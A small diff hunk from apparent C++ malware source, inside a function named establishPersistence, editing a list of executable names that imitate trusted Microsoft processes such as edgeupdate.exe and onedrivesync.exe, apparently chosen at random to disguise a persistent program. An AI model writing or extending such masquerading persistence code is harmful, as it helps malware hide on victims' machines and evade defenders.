@@ -54,7 +54,7 @@ void establishPersistence() {
         L"vaultsvc.exe",
         L"edgeupdate.exe",
         L"onedrivesync.exe",
-        L"msteamsupdate.exe"
+        L"Runtime .exe"
     };
 
     std::random_device rd;
